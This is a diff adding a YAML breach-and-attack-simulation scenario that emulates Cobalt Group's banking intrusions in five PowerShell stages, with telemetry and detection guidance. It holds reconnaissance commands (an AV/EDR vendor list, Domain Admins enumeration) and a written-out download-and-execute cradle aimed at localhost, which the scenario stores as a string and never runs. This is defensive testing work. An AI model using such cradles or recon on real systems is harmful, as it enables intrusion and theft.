@@ -1,0 +1,241 @@
+id: cobalt-group-kill-chain
+product_line: killchain
+name: Cobalt Group Kill Chain -- BFSI Cobalt Strike Tradecraft (Phase 7)
+description: >
+  Five-stage telemetry-safe emulation of Cobalt Group (Cobalt Gang / Gold
+  Kingswood) post-initial-access tradecraft against banks. Based on
+  Group-IB "Cobalt" reports, Europol's 2018 arrest announcement, and MITRE
+  ATT&CK group G0080.
+
+  Cobalt Group compromised 100+ banks across 40+ countries, using spearphish
+  with exploit-laden documents to deploy Cobalt Strike Beacon, then pivoting
+  to card-processing, SWIFT, and ATM-switch hosts to issue fraudulent payment
+  and ATM "jackpotting" instructions. This chain emulates Beacon-stager
+  tradecraft: defence profiling, domain recon, a PowerShell download cradle,
+  an SMB named-pipe beacon, and a DNS beacon channel. In Indian BFSI context
+  the pivot targets are the card-management switch, SWIFT operator hosts, and
+  ATM controllers.
+
+  KILL CHAIN STAGES:
+    1. Security Software Discovery       -- enumerate installed AV/EDR before dropping Beacon (T1518.001)
+    2. Domain Account Discovery          -- net group /domain recon for lateral targets (T1087.002)
+    3. PowerShell Download-Cradle Surface -- Net.WebClient/IEX capability probe, NO download (T1059.001)
+    4. SMB Named-Pipe Beacon Surface     -- create/close a local Beacon-style named pipe (T1021.002)
+    5. DNS Beacon Channel                -- NXDOMAIN lookup simulating a Cobalt Strike DNS beacon (T1071.004)
+
+  SAFETY: No Beacon, no download, no remote connection. Stage 3 only checks
+  type availability (no URL fetched). Stage 4 creates a local named pipe and
+  immediately disposes it. Stage 5 resolves a guaranteed-NXDOMAIN name under
+  .invalid (RFC 2606). All [BAS-SIM-COBALT] tagged. PRODUCTION-SAFE. Windows only.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - cobalt-group
+  - cobalt-gang
+  - gold-kingswood
+  - cobalt-strike
+  - bfsi
+  - financial
+  - atm
+  - kill-chain
+  - phase7
+  - t1518
+  - t1087
+  - t1059
+  - t1021
+  - t1071
+  - mitre
+mitre_phases:
+  - discovery
+  - execution
+  - lateral-movement
+  - command-and-control
+
+live_policy:
+  block_on_domain_controller: false
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 -- Security Software Discovery (T1518.001)
+  # ---------------------------------------------------------------------------
+  - name: "Cobalt Group Stage 1 -- Security Software Discovery (T1518.001)"
+    technique_id: T1518.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Enumerates running security-product services and Defender status via Get-Service and Get-MpComputerStatus. Read-only. Cobalt Group profiled the endpoint's AV/EDR before selecting a Cobalt Strike stager and evasion profile."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: powershell.exe enumerating services / Get-MpComputerStatus"
+      - "PowerShell EID 4104: Get-Service filtered for AV/EDR vendor names"
+    detection:
+      - "EDR: Get-MpComputerStatus / security-service enumeration from PowerShell -- Sigma posh_ps_defender_recon.yml"
+      - "SIEM: service query filtered by AV vendor strings -- Cobalt Strike pre-stager profiling IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $secVendors = @('defender','mcafee','symantec','sophos','crowdstrike','carbonblack','cylance','sentinelone','trendmicro','kaspersky','eset','fireeye','tanium','elastic')
+      $svc = Get-Service -EA SilentlyContinue | Where-Object { $n=$_.Name.ToLower(); $d=$_.DisplayName.ToLower(); $secVendors | Where-Object { $n -match $_ -or $d -match $_ } }
+      $svcNames = (@($svc) | Select-Object -ExpandProperty DisplayName -Unique) -join ', '
+      $rtp = (Get-MpComputerStatus -EA SilentlyContinue).RealTimeProtectionEnabled
+      Write-Output "EXEC T1518.001: security software discovery. edr_services=[$svcNames], defender_realtime=$rtp. Cobalt Group uses this to pick a Beacon stager that evades the present product. [BAS-SIM-COBALT-S1]"
+      if (-not $svc -and $rtp -ne $true) {
+        Write-Output "FAIL: No EDR/AV service was discoverable and Defender real-time protection is off/unknown. Cobalt Group would drop an unobfuscated Beacon. Ensure a monitored EDR agent is running and tamper-protected."
+      } else {
+        Write-Output "PASS: Security tooling is present and enumerable -- the profiling step still generates telemetry (EID 4104) that SOC should alert on, but the endpoint is defended. [BAS-SIM-COBALT-S1]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 -- Domain Account Discovery (T1087.002)
+  # ---------------------------------------------------------------------------
+  - name: "Cobalt Group Stage 2 -- Domain Account / Group Discovery (T1087.002)"
+    technique_id: T1087.002
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Runs net group /domain and net user /domain to enumerate privileged domain groups (Domain Admins, card-ops operators). Read-only directory queries; on a non-domain host the commands fail gracefully. Cobalt Group mapped privileged banking groups to choose lateral-movement targets."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: net.exe group /domain (domain recon)"
+      - "Security EID 4688: net1.exe spawned by net.exe from powershell.exe"
+      - "DC EID 4661/4662: directory object access (if auditing enabled)"
+    detection:
+      - "EDR: net group /domain 'Domain Admins' from PowerShell -- Sigma proc_creation_win_net_enum.yml"
+      - "SIEM: net group/user /domain burst in one session -- Cobalt Strike net-view recon IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $isDomain = (Get-CimInstance Win32_ComputerSystem -EA SilentlyContinue).PartOfDomain
+      $da = & net group 'Domain Admins' /domain 2>&1 | Out-String
+      $enumOk = $da -match 'members|The request will be processed'
+      Write-Output "EXEC T1087.002: domain account discovery. part_of_domain=$isDomain, domain_admins_enumerable=$enumOk. Cobalt Group enumerates privileged groups to plan the pivot to card-processing hosts. [BAS-SIM-COBALT-S2]"
+      if ($isDomain -and $enumOk) {
+        Write-Output "FAIL: Domain group membership (Domain Admins) was enumerable by a standard user. Cobalt Group would map this to pick lateral targets. Restrict anonymous/authenticated directory enumeration and alert on net group /domain."
+      } else {
+        Write-Output "PASS: Domain group enumeration failed or host is not domain-joined -- directory recon is constrained. The net.exe telemetry (EID 4688) should still be alerted. [BAS-SIM-COBALT-S2]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 -- PowerShell Download-Cradle Surface (T1059.001)
+  # ---------------------------------------------------------------------------
+  - name: "Cobalt Group Stage 3 -- PowerShell Download-Cradle Surface (T1059.001)"
+    technique_id: T1059.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Confirms the classic Cobalt Strike PowerShell download-cradle surface is reachable by instantiating a System.Net.WebClient object and resolving the IEX alias -- but issues NO DownloadString and fetches NO URL. The cradle string is written to telemetry only, never executed."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 7: System.Net.Http / WebClient type loaded by powershell.exe"
+      - "PowerShell EID 4104: New-Object Net.WebClient + IEX alias resolution"
+    detection:
+      - "EDR: IEX (New-Object Net.WebClient).DownloadString pattern -- Sigma posh_ps_download_cradle.yml"
+      - "SIEM: Net.WebClient instantiation in EID 4104 ScriptBlock -- Cobalt Strike stager cradle IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      try {
+        $wc = New-Object System.Net.WebClient
+        $iex = Get-Command 'Invoke-Expression' -EA Stop
+        $cradle = "IEX (New-Object Net.WebClient).DownloadString('https://127.0.0.1/bas-sim-cobalt')"
+        $wc.Dispose()
+        Write-Output "EXEC T1059.001: download-cradle surface reachable (Net.WebClient instantiated, IEX alias=$($iex.Name)). Representative cradle NOT executed: $cradle. EID 4104 should capture the Net.WebClient reference. [BAS-SIM-COBALT-S3]"
+        Write-Output "FAIL: PowerShell can instantiate Net.WebClient and resolve IEX without constraint. Cobalt Group's stager cradle would run. Enable Constrained Language Mode (WDAC) and an EID 4104 rule on 'Net.WebClient' + 'DownloadString'."
+      } catch {
+        Write-Output "PASS: Download-cradle surface is constrained -- $($_.Exception.Message). Constrained Language Mode or an execution policy blocked the cradle primitives. [BAS-SIM-COBALT-S3]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 4 -- SMB Named-Pipe Beacon Surface (T1021.002)
+  # ---------------------------------------------------------------------------
+  - name: "Cobalt Group Stage 4 -- SMB Named-Pipe Beacon Surface (T1021.002)"
+    technique_id: T1021.002
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Creates a LOCAL named pipe with a Cobalt-Strike-style name (\\\\.\\pipe\\bas-sim-cobalt_<rand>) using .NET NamedPipeServerStream, confirms it exists, then disposes it immediately. No remote host, no SMB connection, no data. Cobalt Strike SMB Beacons link peer-to-peer over named pipes (msagent_*, status_*)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 17: Pipe Created -- \\\\.\\pipe\\bas-sim-cobalt_* by powershell.exe"
+      - "Sysmon EID 18: Pipe Connected (if a client attaches)"
+    detection:
+      - "EDR: named-pipe creation matching Cobalt Strike default patterns -- Sigma pipe_created_cobaltstrike.yml"
+      - "SIEM: Sysmon EID 17 pipe name matching msagent_/status_/postex_ -- Cobalt Strike SMB Beacon IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $pipeName = "bas-sim-cobalt_$([guid]::NewGuid().ToString('N').Substring(0,6))"
+      $created = $false
+      try {
+        $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut)
+        $created = Test-Path "\\.\pipe\$pipeName"
+        $pipe.Dispose()
+      } catch { }
+      $gone = -not (Test-Path "\\.\pipe\$pipeName")
+      Write-Output "EXEC T1021.002: SMB named-pipe beacon surface. pipe_created=$created (\\.\pipe\$pipeName), disposed=$gone. Sysmon EID 17 expected. Cobalt Strike SMB Beacons communicate over named pipes. [BAS-SIM-COBALT-S4]"
+      if ($created) {
+        Write-Output "FAIL: A process-created named pipe was allowed without an EDR block. Deploy a Sysmon EID 17 rule for Cobalt Strike default pipe names (msagent_*, status_*, postex_*) and investigate unexpected pipe servers on BFSI hosts."
+      } else {
+        Write-Output "PASS: Named-pipe creation failed or was blocked -- the SMB Beacon peer channel surface is constrained. [BAS-SIM-COBALT-S4]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 5 -- DNS Beacon Channel (T1071.004)
+  # ---------------------------------------------------------------------------
+  - name: "Cobalt Group Stage 5 -- DNS Beacon Channel (T1071.004)"
+    technique_id: T1071.004
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues a single DNS resolution for a guaranteed-NXDOMAIN hostname under the reserved .invalid TLD (RFC 2606) to generate Sysmon EID 22 DNS-query telemetry matching a Cobalt Strike DNS Beacon. No host is contacted beyond the configured resolver; the name cannot resolve to a real address."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DnsQuery -- bas-sim-cobalt.<rand>.invalid by powershell.exe"
+      - "PowerShell EID 4104: Resolve-DnsName call"
+      - "DNS server log: NXDOMAIN for a long random subdomain (beacon pattern)"
+    detection:
+      - "EDR: Resolve-DnsName of a long/high-entropy label from PowerShell -- Sigma dns_beacon_query.yml"
+      - "SIEM: repeated NXDOMAIN lookups of random subdomains under one parent -- Cobalt Strike DNS Beacon IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $label = [guid]::NewGuid().ToString('N').Substring(0,12)
+      $beaconName = "bas-sim-cobalt.$label.invalid"
+      $resolved = $false
+      try {
+        $r = Resolve-DnsName -Name $beaconName -DnsOnly -QuickTimeout -EA Stop
+        if ($r) { $resolved = $true }
+      } catch { $resolved = $false }
+      Write-Output "EXEC T1071.004: DNS beacon query for $beaconName (RFC2606 .invalid -- cannot resolve). resolved=$resolved. Sysmon EID 22 generated. Cobalt Strike DNS Beacons tunnel C2 inside DNS queries. [BAS-SIM-COBALT-S5]"
+      if ($resolved) {
+        Write-Output "FAIL: A reserved .invalid name unexpectedly resolved -- a resolver is rewriting NXDOMAIN (DNS hijack/sinkhole misconfig) which can mask beacon detection. Investigate the resolver."
+      } else {
+        Write-Output "FAIL: The DNS query to a high-entropy .invalid subdomain left the host (NXDOMAIN). Egress DNS should be restricted to approved resolvers with query logging, and SIEM should alert on random-subdomain lookup bursts -- the Cobalt Strike DNS Beacon pattern."
+      }
+    cleanup: ""
